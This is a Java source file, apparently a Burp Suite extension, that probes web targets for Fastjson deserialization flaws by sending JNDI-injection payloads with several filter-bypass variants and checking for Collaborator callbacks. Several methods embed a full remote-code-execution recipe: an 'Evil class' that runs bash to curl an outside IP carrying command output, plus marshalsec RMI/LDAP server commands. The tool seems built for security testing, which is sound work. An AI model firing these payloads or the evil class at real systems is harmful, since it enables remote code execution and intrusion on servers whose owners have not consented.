package burp.vuls;

import burp.*;
import burp.util.HttpRequestThread;
import burp.util.HttpResult;

import java.io.IOException;
import java.io.OutputStream;
import java.io.PrintWriter;

public class FastJson {

    public static void JdbcRowSetImpl_0() {
        String poc = "Condition\n1.2.24 + JDK1.8.0_102\n\n" +
                "Evil class\npublic class Calc{\n" +
                "    public Calc(){\n" +
                "        try{\n" +
                "        \t// Runtime.getRuntime().exec(\"calc\");\n" +
                "            Runtime rt = Runtime.getRuntime();\n" +
                "            String[] commands = {\"bash\",\"-c\",\"curl http://172.17.237.185:8808/`uname`\"};\n" +
                "            Process pc = rt.exec(commands);\n" +
                "            pc.waitFor(); \n" +
                "        }catch (Exception e){\n" +
                "            e.printStackTrace();\n" +
                "        }\n" +
                "    }\n" +
                "    public static void main(String[] argv){\n" +
                "        Calc c = new Calc();\n" +
                "    }\n" +
                "}\n\n" +
                "Step1\nstart http service -> python -m http.server 8808\n\n" +
                "Step2\nmarshalsec start rmi/ldap service, \n" +
                "  rmi: java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer \"http://httpserver-ip:8808/#Calc\"\n" +
                "  ladp: java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer \"http://httpserver-ip:8808/#Calc\"\n\n" +
                "Step3\npoc:\n" +
                "{\"handsome\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://xxx.com/aaa\",\"autoCommit\":true}}";
        // 1.2.24 + JDK1.8.0_102
        IBurpCollaboratorClientContext collaboratorClientContext = BurpExtender.callbacks.createBurpCollaboratorClientContext();
        String val = collaboratorClientContext.generatePayload(true);
        // 据说可以覆盖所有版本
        String payload = "{\"handsome\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://" + val +"/name\",\"autoCommit\":true}}";

        // fix: java.lang.RuntimeException: Extensions should not make HTTP requests in the Swing event dispatch thread
        // swing事件是在特殊的线程中执行，发起http请求需要另外的线程进行
        HttpRequestThread httpRequestThread = new HttpRequestThread(payload);
        Thread thread = new Thread(httpRequestThread);
        thread.start();
        try {
            // 等待，直到运行结束
            thread.join();
        } catch (InterruptedException e) {
            OutputStream out = BurpExtender.callbacks.getStderr();
            PrintWriter p = new PrintWriter(out);
            e.printStackTrace(p);
            try {
                p.flush();
                out.flush();
            } catch (IOException ioException) {
                ioException.printStackTrace();
            }
        }
        HttpResult httpResult = httpRequestThread.getResulemessageInfo();
        if (httpResult != null && collaboratorClientContext.fetchCollaboratorInteractionsFor(val).size() != 0) {
            BurpExtender.log.add(new BurpExtender.LogEntry(BurpExtender.log.size(), BurpExtender.callbacks.saveBuffersToTempFiles(httpResult.httpRequestResponse), httpResult.Url, "JdbcRowSetImpl_0", poc, "hack!"));
        } else {
            BurpExtender.log.add(new BurpExtender.LogEntry(BurpExtender.log.size(), BurpExtender.callbacks.saveBuffersToTempFiles(httpResult.httpRequestResponse), httpResult.Url, "JdbcRowSetImpl_0", poc, "pass"));
        }
    }

    public static void JdbcRowSetImpl_1() {
        String poc = "Condition\n1.2.24 + JDK1.8.0_102\n\n" +
                "Evil class\npublic class Calc{\n" +
                "    public Calc(){\n" +
                "        try{\n" +
                "        \t// Runtime.getRuntime().exec(\"calc\");\n" +
                "            Runtime rt = Runtime.getRuntime();\n" +
                "            String[] commands = {\"bash\",\"-c\",\"curl http://172.17.237.185:8808/`uname`\"};\n" +
                "            Process pc = rt.exec(commands);\n" +
                "            pc.waitFor(); \n" +
                "        }catch (Exception e){\n" +
                "            e.printStackTrace();\n" +
                "        }\n" +
                "    }\n" +
                "    public static void main(String[] argv){\n" +
                "        Calc c = new Calc();\n" +
                "    }\n" +
                "}\n\n" +
                "Step1\nstart http service -> python -m http.server 8808\n\n" +
                "Step2\nmarshalsec start rmi/ldap service, \n" +
                "  rmi: java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer \"http://httpserver-ip:8808/#Calc\"\n" +
                "  ladp: java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer \"http://httpserver-ip:8808/#Calc\"\n\n" +
                "Step3\npoc:\n" +
                "{\"handsome\":{\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://xxx.com/aaa\",\"autoCommit\":true}}";
        // 1.2.24 + JDK1.8.0_102
        IBurpCollaboratorClientContext collaboratorClientContext = BurpExtender.callbacks.createBurpCollaboratorClientContext();
        String val = collaboratorClientContext.generatePayload(true);
        // 据说可以覆盖所有版本
        String payload = "{\"handsome\":{\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://" + val +"/name\",\"autoCommit\":true}}";

        // fix: java.lang.RuntimeException: Extensions should not make HTTP requests in the Swing event dispatch thread
        // swing事件是在特殊的线程中执行，发起http请求需要另外的线程进行
        HttpRequestThread httpRequestThread = new HttpRequestThread(payload);
        try {
            Thread thread = new Thread(httpRequestThread);
            thread.start();
            // // 等待，直到运行结束
            thread.join();
        } catch (Exception e) {
            OutputStream out = BurpExtender.callbacks.getStderr();
            PrintWriter p = new PrintWriter(out);
            e.printStackTrace(p);
            try {
                p.flush();
                out.flush();
            } catch (IOException ioException) {
                ioException.printStackTrace();
            }
        }
        HttpResult httpResult = httpRequestThread.getResulemessageInfo();
        if (httpResult != null && collaboratorClientContext.fetchCollaboratorInteractionsFor(val).size() != 0) {
            BurpExtender.log.add(new BurpExtender.LogEntry(BurpExtender.log.size(), BurpExtender.callbacks.saveBuffersToTempFiles(httpResult.httpRequestResponse), httpResult.Url, "JdbcRowSetImpl_1", poc, "hack!"));
        } else {
            BurpExtender.log.add(new BurpExtender.LogEntry(BurpExtender.log.size(), BurpExtender.callbacks.saveBuffersToTempFiles(httpResult.httpRequestResponse), httpResult.Url, "JdbcRowSetImpl_1", poc, "pass"));
        }
    }

    public static void JdbcRowSetImpl_2() {
        String poc = "Condition\n1.2.24 + JDK1.8.0_102\n\n" +
                "Evil class\npublic class Calc{\n" +
                "    public Calc(){\n" +
                "        try{\n" +
                "        \t// Runtime.getRuntime().exec(\"calc\");\n" +
                "            Runtime rt = Runtime.getRuntime();\n" +
                "            String[] commands = {\"bash\",\"-c\",\"curl http://172.17.237.185:8808/`uname`\"};\n" +
                "            Process pc = rt.exec(commands);\n" +
                "            pc.waitFor(); \n" +
                "        }catch (Exception e){\n" +
                "            e.printStackTrace();\n" +
                "        }\n" +
                "    }\n" +
                "    public static void main(String[] argv){\n" +
                "        Calc c = new Calc();\n" +
                "    }\n" +
                "}\n\n" +
                "Step1\nstart http service -> python -m http.server 8808\n\n" +
                "Step2\nmarshalsec start rmi/ldap service, \n" +
                "  rmi: java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer \"http://httpserver-ip:8808/#Calc\"\n" +
                "  ladp: java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer \"http://httpserver-ip:8808/#Calc\"\n\n" +
                "Step3\npoc:\n" +
                "{\"handsome\":{\"@type\":\"[com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://xxx.com/aaa\",\"autoCommit\":true}}";
        // 1.2.24 + JDK1.8.0_102
        IBurpCollaboratorClientContext collaboratorClientContext = BurpExtender.callbacks.createBurpCollaboratorClientContext();
        String val = collaboratorClientContext.generatePayload(true);
        // 据说可以覆盖所有版本
        String payload = "{\"handsome\":{\"@type\":\"[com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://" + val +"/name\",\"autoCommit\":true}}";

        // fix: java.lang.RuntimeException: Extensions should not make HTTP requests in the Swing event dispatch thread
        // swing事件是在特殊的线程中执行，发起http请求需要另外的线程进行
        HttpRequestThread httpRequestThread = new HttpRequestThread(payload);
        try {
            Thread thread = new Thread(httpRequestThread);
            thread.start();
            // // 等待，直到运行结束
            thread.join();
        } catch (Exception e) {
            OutputStream out = BurpExtender.callbacks.getStderr();
            PrintWriter p = new PrintWriter(out);
            e.printStackTrace(p);
            try {
                p.flush();
                out.flush();
            } catch (IOException ioException) {
                ioException.printStackTrace();
            }
        }
        HttpResult httpResult = httpRequestThread.getResulemessageInfo();
        if (httpResult != null && collaboratorClientContext.fetchCollaboratorInteractionsFor(val).size() != 0) {
            BurpExtender.log.add(new BurpExtender.LogEntry(BurpExtender.log.size(), BurpExtender.callbacks.saveBuffersToTempFiles(httpResult.httpRequestResponse), httpResult.Url, "JdbcRowSetImpl_2", poc, "hack!"));
        } else {
            BurpExtender.log.add(new BurpExtender.LogEntry(BurpExtender.log.size(), BurpExtender.callbacks.saveBuffersToTempFiles(httpResult.httpRequestResponse), httpResult.Url, "JdbcRowSetImpl_2", poc, "pass"));
        }
    }

    public static void JdbcRowSetImpl_3() {
        String poc = "Condition\n1.2.24 + JDK1.8.0_102\n\n" +
                "Evil class\npublic class Calc{\n" +
                "    public Calc(){\n" +
                "        try{\n" +
                "        \t// Runtime.getRuntime().exec(\"calc\");\n" +
                "            Runtime rt = Runtime.getRuntime();\n" +
                "            String[] commands = {\"bash\",\"-c\",\"curl http://172.17.237.185:8808/`uname`\"};\n" +
                "            Process pc = rt.exec(commands);\n" +
                "            pc.waitFor(); \n" +
                "        }catch (Exception e){\n" +
                "            e.printStackTrace();\n" +
                "        }\n" +
                "    }\n" +
                "    public static void main(String[] argv){\n" +
                "        Calc c = new Calc();\n" +
                "    }\n" +
                "}\n\n" +
                "Step1\nstart http service -> python -m http.server 8808\n\n" +
                "Step2\nmarshalsec start rmi/ldap service, \n" +
                "  rmi: java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer \"http://httpserver-ip:8808/#Calc\"\n" +
                "  ladp: java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer \"http://httpserver-ip:8808/#Calc\"\n\n" +
                "Step3\npoc:\n" +
                "{\"handsome\":{\"@type\":\"LL\\u0063\\u006f\\u006d.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://xxx.com/aaa\",\"autoCommit\":true}}";
        // 1.2.24 + JDK1.8.0_102
        IBurpCollaboratorClientContext collaboratorClientContext = BurpExtender.callbacks.createBurpCollaboratorClientContext();
        String val = collaboratorClientContext.generatePayload(true);
        // 据说可以覆盖所有版本
        String payload = "{\"handsome\":{\"@type\":\"LL\\u0063\\u006f\\u006d.sun.rowset.JdbcRowSetImpl;;\",\"dataSourceName\":\"rmi://" + val +"/name\",\"autoCommit\":true}}";

        // fix: java.lang.RuntimeException: Extensions should not make HTTP requests in the Swing event dispatch thread
        // swing事件是在特殊的线程中执行，发起http请求需要另外的线程进行
        HttpRequestThread httpRequestThread = new HttpRequestThread(payload);
        try {
            Thread thread = new Thread(httpRequestThread);
            thread.start();
            // // 等待，直到运行结束
            thread.join();
        } catch (Exception e) {
            OutputStream out = BurpExtender.callbacks.getStderr();
            PrintWriter p = new PrintWriter(out);
            e.printStackTrace(p);
            try {
                p.flush();
                out.flush();
            } catch (IOException ioException) {
                ioException.printStackTrace();
            }
        }
        HttpResult httpResult = httpRequestThread.getResulemessageInfo();
        if (httpResult != null && collaboratorClientContext.fetchCollaboratorInteractionsFor(val).size() != 0) {
            BurpExtender.log.add(new BurpExtender.LogEntry(BurpExtender.log.size(), BurpExtender.callbacks.saveBuffersToTempFiles(httpResult.httpRequestResponse), httpResult.Url, "JdbcRowSetImpl_3", poc, "hack!"));
        } else {
            BurpExtender.log.add(new BurpExtender.LogEntry(BurpExtender.log.size(), BurpExtender.callbacks.saveBuffersToTempFiles(httpResult.httpRequestResponse), httpResult.Url, "JdbcRowSetImpl_3", poc, "pass"));
        }
    }

    public static void JdbcRowSetImpl_4() {
        String poc = "Condition\n1.2.24 + JDK1.8.0_102\n\n" +
                "Evil class\npublic class Calc{\n" +
                "    public Calc(){\n" +
                "        try{\n" +
                "        \t// Runtime.getRuntime().exec(\"calc\");\n" +
                "            Runtime rt = Runtime.getRuntime();\n" +
                "            String[] commands = {\"bash\",\"-c\",\"curl http://172.17.237.185:8808/`uname`\"};\n" +
                "            Process pc = rt.exec(commands);\n" +
                "            pc.waitFor(); \n" +
                "        }catch (Exception e){\n" +
                "            e.printStackTrace();\n" +
                "        }\n" +
                "    }\n" +
                "    public static void main(String[] argv){\n" +
                "        Calc c = new Calc();\n" +
                "    }\n" +
                "}\n\n" +
                "Step1\nstart http service -> python -m http.server 8808\n\n" +
                "Step2\nmarshalsec start rmi/ldap service, \n" +
                "  rmi: java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer \"http://httpserver-ip:8808/#Calc\"\n" +
                "  ladp: java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer \"http://httpserver-ip:8808/#Calc\"\n\n" +
                "Step3\npoc:\n" +
                "{\"handsome\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"x\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://xxx.com/aaa\",\"autoCommit\":true}}}";
        // 1.2.24 + JDK1.8.0_102
        IBurpCollaboratorClientContext collaboratorClientContext = BurpExtender.callbacks.createBurpCollaboratorClientContext();
        String val = collaboratorClientContext.generatePayload(true);
        // 据说可以覆盖所有版本
        String payload = "{\"handsome\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"x\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://" + val +"/name\",\"autoCommit\":true}}";

        // fix: java.lang.RuntimeException: Extensions should not make HTTP requests in the Swing event dispatch thread
        // swing事件是在特殊的线程中执行，发起http请求需要另外的线程进行
        HttpRequestThread httpRequestThread = new HttpRequestThread(payload);
        try {
            Thread thread = new Thread(httpRequestThread);
            thread.start();
            // // 等待，直到运行结束
            thread.join();
        } catch (Exception e) {
            OutputStream out = BurpExtender.callbacks.getStderr();
            PrintWriter p = new PrintWriter(out);
            e.printStackTrace(p);
            try {
                p.flush();
                out.flush();
            } catch (IOException ioException) {
                ioException.printStackTrace();
            }
        }
        HttpResult httpResult = httpRequestThread.getResulemessageInfo();
        if (httpResult != null && collaboratorClientContext.fetchCollaboratorInteractionsFor(val).size() != 0) {
            BurpExtender.log.add(new BurpExtender.LogEntry(BurpExtender.log.size(), BurpExtender.callbacks.saveBuffersToTempFiles(httpResult.httpRequestResponse), httpResult.Url, "JdbcRowSetImpl_4", poc, "hack!"));
        } else {
            BurpExtender.log.add(new BurpExtender.LogEntry(BurpExtender.log.size(), BurpExtender.callbacks.saveBuffersToTempFiles(httpResult.httpRequestResponse), httpResult.Url, "JdbcRowSetImpl_4", poc, "pass"));
        }
    }

    public static void JndiDataSourceFactory() {
        IBurpCollaboratorClientContext collaboratorClientContext = BurpExtender.callbacks.createBurpCollaboratorClientContext();
        String val = collaboratorClientContext.generatePayload(true);
        // 据说可以覆盖所有版本
        String payload = "{\"@type\":\"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\",\"properties\":{\"data_source\":\"rmi://"+ val +"/name\"}}";

        // fix: java.lang.RuntimeException: Extensions should not make HTTP requests in the Swing event dispatch thread
        // swing事件是在特殊的线程中执行，发起http请求需要另外的线程进行
        HttpRequestThread httpRequestThread = new HttpRequestThread(payload);
        try {
            Thread thread = new Thread(httpRequestThread);
            thread.start();
            // // 等待，直到运行结束
            thread.join();
        } catch (Exception e) {
            OutputStream out = BurpExtender.callbacks.getStderr();
            PrintWriter p = new PrintWriter(out);
            e.printStackTrace(p);
            try {
                p.flush();
                out.flush();
            } catch (IOException ioException) {
                ioException.printStackTrace();
            }
        }
        HttpResult httpResult = httpRequestThread.getResulemessageInfo();
        if (httpResult != null && collaboratorClientContext.fetchCollaboratorInteractionsFor(val).size() != 0) {
            BurpExtender.log.add(new BurpExtender.LogEntry(BurpExtender.log.size(), BurpExtender.callbacks.saveBuffersToTempFiles(httpResult.httpRequestResponse), httpResult.Url, "JndiDataSourceFactory", "1.2.24 + JDK1.8.0_102", "hack!"));
        } else {
            BurpExtender.log.add(new BurpExtender.LogEntry(BurpExtender.log.size(), BurpExtender.callbacks.saveBuffersToTempFiles(httpResult.httpRequestResponse), httpResult.Url, "JndiDataSourceFactory", "1.2.24 + JDK1.8.0_102", "pass"));
        }
    }

    public static void SimpleJndiBeanFactory() {
        IBurpCollaboratorClientContext collaboratorClientContext = BurpExtender.callbacks.createBurpCollaboratorClientContext();
        String val = collaboratorClientContext.generatePayload(true);
        // 据说可以覆盖所有版本
        String payload = "Set [{\"@type\":\"org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor\",\"beanFactory\":{\"@type\":\"org.springframework.jndi.support.SimpleJndiBeanFactory\",\"shareableResources\":[\"rmi://"+val+"/name\"]},\"adviceBeanName\":\"rmi://"+ val +"/name\"},{\"@type\":\"org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor\",}]";

        // fix: java.lang.RuntimeException: Extensions should not make HTTP requests in the Swing event dispatch thread
        // swing事件是在特殊的线程中执行，发起http请求需要另外的线程进行
        HttpRequestThread httpRequestThread = new HttpRequestThread(payload);
        try {
            Thread thread = new Thread(httpRequestThread);
            thread.start();
            // // 等待，直到运行结束
            thread.join();
        } catch (Exception e) {
            OutputStream out = BurpExtender.callbacks.getStderr();
            PrintWriter p = new PrintWriter(out);
            e.printStackTrace(p);
            try {
                p.flush();
                out.flush();
            } catch (IOException ioException) {
                ioException.printStackTrace();
            }
        }
        HttpResult httpResult = httpRequestThread.getResulemessageInfo();
        if (httpResult != null && collaboratorClientContext.fetchCollaboratorInteractionsFor(val).size() != 0) {
            BurpExtender.log.add(new BurpExtender.LogEntry(BurpExtender.log.size(), BurpExtender.callbacks.saveBuffersToTempFiles(httpResult.httpRequestResponse), httpResult.Url, "SimpleJndiBeanFactory", "1.2.24 + JDK1.8.0_102", "hack!"));
        } else {
            BurpExtender.log.add(new BurpExtender.LogEntry(BurpExtender.log.size(), BurpExtender.callbacks.saveBuffersToTempFiles(httpResult.httpRequestResponse), httpResult.Url, "SimpleJndiBeanFactory", "1.2.24 + JDK1.8.0_102", "pass"));
        }
    }
}
